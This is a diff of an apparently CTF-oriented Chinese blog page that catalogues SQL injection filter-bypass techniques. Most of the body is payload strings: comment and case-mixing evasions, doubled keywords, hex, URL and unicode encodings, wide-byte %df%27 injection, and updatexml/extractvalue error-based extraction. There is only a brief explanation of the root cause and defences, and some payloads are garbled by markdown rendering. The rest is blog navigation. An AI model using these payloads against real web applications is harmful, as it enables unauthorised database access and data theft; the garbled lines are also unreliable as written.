+<h1 id="9-绕过union，select，where等："><a href="#9-绕过union，select，where等：" class="headerlink" title="9.绕过union，select，where等："></a>9.绕过union，select，where等：</h1><h2 id="（1）使用注释符绕过："><a href="#（1）使用注释符绕过：" class="headerlink" title="（1）使用注释符绕过："></a>（1）使用注释符绕过：</h2><p>常用注释符：</p>
+<p>//，– , /**/, #, –+, – -, ;,%00,–a</p>
+<p>用法：</p>
+<p>U/<strong>/NION/</strong>/SE/<strong>/LECT/</strong>/user，pwd from user</p>
+<h2 id="（2）使用大小写绕过："><a href="#（2）使用大小写绕过：" class="headerlink" title="（2）使用大小写绕过："></a>（2）使用大小写绕过：</h2><p>id=-1’UnIoN/**/SeLeCT</p>
+<h2 id="（3）内联注释绕过："><a href="#（3）内联注释绕过：" class="headerlink" title="（3）内联注释绕过："></a>（3）内联注释绕过：</h2><p>id=-1’/<em>!UnIoN</em>/SeLeCT1,2,concat(/<em>!table_name</em>/) FrOM/<em>information_schema</em>/.tables/<em>!WHERE</em>//<em>!TaBlE_ScHeMa</em>/like database()#</p>
+<h2 id="（4）-双关键字绕过："><a href="#（4）-双关键字绕过：" class="headerlink" title="（4） 双关键字绕过："></a>（4） 双关键字绕过：</h2><p>id=-1’UNIunionONSeLselectECT1,2,3–-</p>
+<h1 id="10-通用绕过（编码）："><a href="#10-通用绕过（编码）：" class="headerlink" title="10.通用绕过（编码）："></a>10.通用绕过（编码）：</h1><p>如URLEncode编码，ASCII,HEX,unicode编码绕过：</p>
+<p>or1=1即%6f%72%20%31%3d%31，而Test也可以为CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)。</p>
+<h1 id="11-等价函数绕过："><a href="#11-等价函数绕过：" class="headerlink" title="11.等价函数绕过："></a>11.等价函数绕过：</h1><p>hex()、bin()==&gt;ascii()</p>
+<p>sleep()==&gt;benchmark()</p>
+<p>concat_ws()==&gt;group_concat()</p>
+<p>mid()、substr()==&gt;substring() @@user==&gt;user() @@datadir==&gt;datadir()</p>
+<p>举例：substring()和substr()无法使用时：?id=1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))=74或者：</p>
+<p>substr((select’password’),1,1)=0x70strcmp(left(‘password’,1),0x69)=1strcmp(left(‘password’,1),0x70)=0strcmp(left(‘password’,1),0x71)=-1</p>
+<h1 id="12-宽字节注入："><a href="#12-宽字节注入：" class="headerlink" title="12.宽字节注入："></a>12.宽字节注入：</h1><p>过滤 ‘ 的时候往往利用的思路是将 ‘ 转换为 &#39; 。</p>
+<p>在 mysql 中使用 GBK 编码的时候，会认为两个字符为一个汉字，一般有两种思路：</p>
+<p>（1）%df 吃掉 \ 具体的方法是 urlencode(‘) = %5c%27，我们在 %5c%27 前面添加 %df ，形成 %df%5c%27 ，而 mysql 在 GBK 编码方式的时候会将两个字节当做一个汉字，%df%5c 就是一个汉字，%27 作为一个单独的（’）符号在外面：</p>
+<p>id=-1%df%27union select 1,user(),3–+</p>
+<p>（2）将 &#39; 中的 \ 过滤掉，例如可以构造 %**%5c%5c%27 ，后面的 %5c 会被前面的 %5c 注释掉。</p>
+<p>一般产生宽字节注入的PHP函数：</p>
+<p>1.replace（）：过滤 ‘ \ ，将 ‘ 转化为 &#39; ，将 \  转为 \，将 “ 转为 &quot; 。用思路一。</p>
+<p>2.addslaches()：返回在预定义字符之前添加反斜杠（\）的字符串。预定义字符：’ , “ , \ 。用思路一</p>
+<p>（防御此漏洞，要将 mysql_query 设置为 binary 的方式）</p>
+<p>3.mysql_real_escape_string()：转义下列字符：</p>
+<p>\x00  \n  \r  &#39;“  \x1a</p>
+<p>（防御，将mysql设置为gbk即可）</p>
+<h1 id="过滤-2"><a href="#过滤-2" class="headerlink" title="过滤*2"></a>过滤*2</h1><p>0x00 sql注入的原因</p>
+<p>sql注入的原因，表面上说是因为 拼接字符串，构成sql语句，没有使用 sql语句预编译，绑定变量。</p>
+<p>但是更深层次的原因是，将用户输入的字符串，当成了 “sql语句” 来执行。</p>
+<p>比如上面的 String sql = “select id,no from user where id=” + id;</p>
+<p>我们希望用户输入的 id 的值，仅仅作为一个字符串字面值，传入数据库执行，但是当输入了： 2 or 1=1 时，其中的 or 1=1 并没有作为 where id= 的字面值，而是作为了 sql语句 来执行的。所以其本质是将用户的输入的数据，作为了命令来执行。</p>
+<p>0x01 sql注入绕过</p>
+<p>1.1 注释符绕过</p>
+<p>常用注释符：</p>
+<p>//,– , /<strong>/, #, –+, – -, ;,%00,–aUNION/</strong>/Select/<strong>/user，pwd，fromuserU/</strong>/NION/<strong>/SE/</strong>/LECT/**/user，pwdfromuser</p>
+<p>1.2 大小写绕过</p>
+<p>?id=1+UnIoN/**/SeLeCT</p>
+<p>1.3 内联注释绕过</p>
+<p>id=1/<em>!UnIoN</em>/+SeLeCT+1,2,concat(/<em>!table_name</em>/)+FrOM/<em>information_schema</em>/.tables/<em>!WHERE */+/</em>!TaBlE_ScHeMa*/+like+database()– -</p>
+<p>通常情况下，上面的代码可以绕过过滤器，请注意，我们用的是 Like而不是 =</p>
+<p>1.4 双关键字绕过</p>
+<p>?id=1+UNIunionON+SeLselectECT+1,2,3–</p>
+<p>1.5 编码绕过</p>
+<p>如URLEncode编码，ASCII,HEX,unicode编码绕过</p>
+<p>or1=1即%6f%72%20%31%3d%31，而Test也可以为CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)。十六进制编码SELECT(extractvalue(0x3C613E61646D696E3C2F613E,0x2f61))双重编码绕过?id=1%252f%252a<em>/UNION%252f%252a /SELECT%252f%252a</em>/1,2,password%252f%252a<em>/FROM%252f%252a</em>/Users–+一些unicode编码举例： 单引号：’%u0027 %u02b9%u02bc</p>
+<p>%u02c8%u2032</p>
+<p>%uff07%c0%27%c0%a7%e0%80%a7</p>
+<p>空白：</p>
+<p>%u0020%uff00</p>
+<p>%c0%20%c0%a0%e0%80%a0</p>
+<p>左括号(:</p>
+<p>%u0028%uff08</p>
+<p>%c0%28%c0%a8%e0%80%a8</p>
+<p>右括号):</p>
+<p>%u0029%uff09</p>
+<p>%c0%29%c0%a9%e0%80%a9</p>
+<p>1.6 空格绕过</p>
+<p>两个空格代替一个空格，用Tab代替空格%20 %09 %0a %0b %0c %0d %a0 /**/</p>
+<p>括号绕过空格</p>
+<p>在MySQL中，括号是用来包围子查询的。因此，任何可以计算出结果的语句，都可以用括号包围起来</p>
+<p>select(user())from dual where 1=1 and 2=2;</p>
+<p>1.7 万能密钥绕过</p>
+<p>用经典的or1=1判断绕过,如or‘swords’ =’swords</p>
+<p>1.8 +,-,.号拆解字符串绕过</p>
+<p>?id=1’ or’11+11’=’11+11’”-“和”.”</p>
+<p>1.9 like绕过</p>
+<p>?id=1’ or 1 like 1绕过对“=”，“&gt;”等的过滤</p>
+<p>2.0 in绕过</p>
+<p>or’1’IN(‘swords’)</p>
+<p>2.1 &gt;,&lt;绕过</p>
+<p>or’password’&gt;’pass’or1&lt;3</p>
+<p>2.2 等价函数与命令绕过</p>
+<p>1.函数或变量</p>
+<p>hex()、bin()==&gt;ascii()sleep()==&gt;benchmark()concat_ws()==&gt;group_concat()mid()、substr()==&gt;substring()@@user==&gt;user()@@datadir==&gt;datadir()举例：substring()和substr()无法使用时：?id=1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))=74　或者：substr((select ‘password’),1,1) = 0x70strcmp(left(‘password’,1),0x69)= 1strcmp(left(‘password’,1),0x70)= 0strcmp(left(‘password’,1),0x71)= -1</p>
+<p>2.符号</p>
+<p>and和or有可能不能使用，可以试下&amp;&amp;和||=不能使用的情况，可以考虑尝试&lt;、&gt;</p>
+<p>3.生僻函数</p>
+<p>MySQL/PostgreSQL支持XML函数：SelectUpdateXML(‘ ’,’/script/@x/’,’src=//evil.com’);　　　　　　　　　　?id=1 and 1=(updatexml(1,concat(0x3a,(selectuser())),1))SELECTxmlelement(nameimg,xmlattributes(1assrc,’a\l\x65rt(1)’as\117n\x65rror));　//postgresql?id=1 and extractvalue(1, concat(0x5c, (selecttable_namefrominformation_schema.tableslimit1)));and 1=(updatexml(1,concat(0x5c,(selectuser()),0x5c),1))andextractvalue(1,concat(0x5c, (selectuser()),0x5c))</p>
+<p>2.3 反引号`绕过</p>
+<p>select<code>version()</code>，可以用来过空格和正则，特殊情况下还可以将其做注释符用</p>
+<p>2.4 换行符绕过</p>
+<p>%0a、%0d</p>
+<p>2.5 截断绕过</p>
+<p>%00,%0A,?,/0,……..,%80-%99</p>
+<p>目录字符串，在window下256字节、linux下4096字节时会达到最大值，最大值长度之后的字符将被丢弃。</p>
+<p>././././././././././././././././abc</p>
+<p>abc</p>
+<p>..1/abc/../1/abc/../1/abc</p>
+<p>2.6 宽字节绕过</p>
+<p>过滤单引号时，可以试试宽字节</p>
+<p>%bf%27 %df%27 %aa%27</p>
+<p>2.7 \N绕过</p>
+<p>\N其实相当于NULL字符</p>
+<p>select<em>fromuserswhereid=8E0unionselect1,2,3,4,5,6,7,8,9,0select</em>fromuserswhereid=8.0unionselect1,2,3,4,5,6,7,8,9,0select*fromuserswhereid=\Nunionselect1,2,3,4,5,6,7,8,9,0</p>
 
 
         <hr>
         <!-- Pager -->
         <ul class="pager">
           
-          <li class="previous">
-            <a href="/2021/03/06/MRCTF2020-你传你🐎呢/" data-toggle="tooltip" data-placement="top" title="[MRCTF2020]你传你🐎呢">&larr; Previous Post</a>
-          </li>
-          
           
           <li class="next">
-            <a href="/2021/03/03/XSS构造技巧总结/" data-toggle="tooltip" data-placement="top" title="XSS构造技巧总结">Next Post &rarr;</a>
+            <a href="/2021/03/06/SUCTF-2019-Pythonginx/" data-toggle="tooltip" data-placement="top" title="[SUCTF 2019]Pythonginx">Next Post &rarr;</a>
           </li>
           
         </ul>
@@ -566,7 +618,7 @@
       </a>
     </li>
     <li class="social-share-li">
-      <a target="_blank" class="social-share-icon" href="mailto:?subject=SQL注入攻击的学习&body=Hi,I found this website and thought you might like it http://yoursite-url/2021/03/05/SQL注入攻击的学习/">
+      <a target="_blank" class="social-share-icon" href="mailto:?subject=SQL的各种绕过&body=Hi,I found this website and thought you might like it http://yoursite-url/2021/03/07/SQL的各种绕过/">
         <i class="fa fa-envelope fa-1x" aria-hidden="true"></i>
       </a>
     </li>
@@ -599,7 +651,7 @@
     repo: '',
     owner: '',
     admin: '',
-    id: 'Fri Mar 05 2021 17:11:41 GMT+0800', // Ensure uniqueness and length less than 50
+    id: 'Sun Mar 07 2021 09:20:14 GMT+0800', // Ensure uniqueness and length less than 50
     distractionFreeMode: false, // Facebook-like distraction free mode
     perPage: 10 ,
     pagerDirection: 'last',
@@ -653,7 +705,7 @@
         <div id="toc" class="toc-article">
         <strong class="toc-title">Contents</strong>
         
-          <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#《白帽子讲web安全》SQL注入深度学习"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">《白帽子讲web安全》SQL注入深度学习</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#前言"><span class="toc-nav-number">1.1.</span> <span class="toc-nav-text">前言</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#盲注"><span class="toc-nav-number">1.2.</span> <span class="toc-nav-text">盲注</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#读写文件注入（load-file）"><span class="toc-nav-number">1.3.</span> <span class="toc-nav-text">读写文件注入（load_file）</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#查看secure-file-priv的命令"><span class="toc-nav-number">1.3.0.1.</span> <span class="toc-nav-text">查看secure_file_priv的命令</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#解决方法"><span class="toc-nav-number">1.3.0.2.</span> <span class="toc-nav-text">解决方法</span></a></li></ol></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#宽字节注入"><span class="toc-nav-number">1.4.</span> <span class="toc-nav-text">宽字节注入</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#0x01-认识addslashes"><span class="toc-nav-number">1.4.0.1.</span> <span class="toc-nav-text">0x01 认识addslashes</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#0x02-宽字节注入原理"><span class="toc-nav-number">1.4.0.2.</span> <span class="toc-nav-text">0x02 宽字节注入原理</span></a></li></ol></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#SQL-Column-Truncation-长度绕过"><span class="toc-nav-number">1.5.</span> <span class="toc-nav-text">SQL Column Truncation(长度绕过)</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#CTF技巧"><span class="toc-nav-number">1.6.</span> <span class="toc-nav-text">CTF技巧</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#被过滤"><span class="toc-nav-number">1.6.1.</span> <span class="toc-nav-text">被过滤</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#information"><span class="toc-nav-number">1.6.1.1.</span> <span class="toc-nav-text">information</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#and-or-空格-等连接词"><span class="toc-nav-number">1.6.1.2.</span> <span class="toc-nav-text">and or 空格 等连接词</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#无列表注入"><span class="toc-nav-number">1.6.2.</span> <span class="toc-nav-text">无列表注入</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#报错注入"><span class="toc-nav-number">1.6.3.</span> <span class="toc-nav-text">报错注入</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#转义注入"><span class="toc-nav-number">1.6.4.</span> <span class="toc-nav-text">转义注入</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#BJDCTF-2nd-简单注入"><span class="toc-nav-number">1.6.4.1.</span> <span class="toc-nav-text">[BJDCTF 2nd]简单注入</span></a></li></ol></li></ol></li></ol></li></ol>
+          <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#普通绕过策略"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">普通绕过策略</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#利用符号替代"><span class="toc-nav-number">1.1.</span> <span class="toc-nav-text">利用符号替代</span></a></li></ol></li></ol></li></ol></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#SQL注入一些过滤及绕过总结"><span class="toc-nav-number"></span> <span class="toc-nav-text">SQL注入一些过滤及绕过总结</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#SQL注入绕过技巧"><span class="toc-nav-number"></span> <span class="toc-nav-text">SQL注入绕过技巧</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#1-绕过空格（注释符-，-a0）："><span class="toc-nav-number"></span> <span class="toc-nav-text">1.绕过空格（注释符&#x2F;* *&#x2F;，%a0）：</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#2-括号绕过空格："><span class="toc-nav-number"></span> <span class="toc-nav-text">2.括号绕过空格：</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#3-引号绕过（使用十六进制）："><span class="toc-nav-number"></span> <span class="toc-nav-text">3.引号绕过（使用十六进制）：</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#4-逗号绕过（limit使用from或者offset）（substr使用from-for属于逗号）："><span class="toc-nav-number"></span> <span class="toc-nav-text">4.逗号绕过（limit使用from或者offset）（substr使用from for属于逗号）：</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#5-比较符号（-lt-gt-）绕过（使用greatest-）："><span class="toc-nav-number"></span> <span class="toc-nav-text">5.比较符号（&lt;&gt;）绕过（使用greatest()）：</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#6-or-and-绕过："><span class="toc-nav-number"></span> <span class="toc-nav-text">6.or and 绕过：</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#7-绕过注释符号（-，–）过滤："><span class="toc-nav-number"></span> <span class="toc-nav-text">7.绕过注释符号（#，–）过滤：</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#8-绕过："><span class="toc-nav-number"></span> <span class="toc-nav-text">8.&#x3D;绕过：</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#9-绕过union，select，where等："><span class="toc-nav-number"></span> <span class="toc-nav-text">9.绕过union，select，where等：</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#（1）使用注释符绕过："><span class="toc-nav-number"></span> <span class="toc-nav-text">（1）使用注释符绕过：</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#（2）使用大小写绕过："><span class="toc-nav-number"></span> <span class="toc-nav-text">（2）使用大小写绕过：</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#（3）内联注释绕过："><span class="toc-nav-number"></span> <span class="toc-nav-text">（3）内联注释绕过：</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#（4）-双关键字绕过："><span class="toc-nav-number"></span> <span class="toc-nav-text">（4） 双关键字绕过：</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#10-通用绕过（编码）："><span class="toc-nav-number"></span> <span class="toc-nav-text">10.通用绕过（编码）：</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#11-等价函数绕过："><span class="toc-nav-number"></span> <span class="toc-nav-text">11.等价函数绕过：</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#12-宽字节注入："><span class="toc-nav-number"></span> <span class="toc-nav-text">12.宽字节注入：</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#过滤-2"><span class="toc-nav-number"></span> <span class="toc-nav-text">过滤*2</span></a>
         
         </div>
       </aside>
@@ -678,8 +730,6 @@
             <a class="tag" href="/tags/#WEB" title="WEB">WEB</a>
             
             <a class="tag" href="/tags/#SQL" title="SQL">SQL</a>
-            
-            <a class="tag" href="/tags/#白帽子讲WEB安全" title="白帽子讲WEB安全">白帽子讲WEB安全</a>
             
           </div>
         </section>
@@ -890,7 +940,7 @@
     let jsdelivr = "https://cdn.jsdelivr.net/gh/";
     let gh = "urdr-gungnir";
     let ghPages = gh + ".github.io";
-    let pagePath = "2021/03/05/SQL注入攻击的学习/";
+    let pagePath = "2021/03/07/SQL的各种绕过/";
     let jsdelivrurl;
     if (pagePath.indexOf("index.html") != -1) {
       jsdelivrurl = jsdelivr + gh + "/" + ghPages;
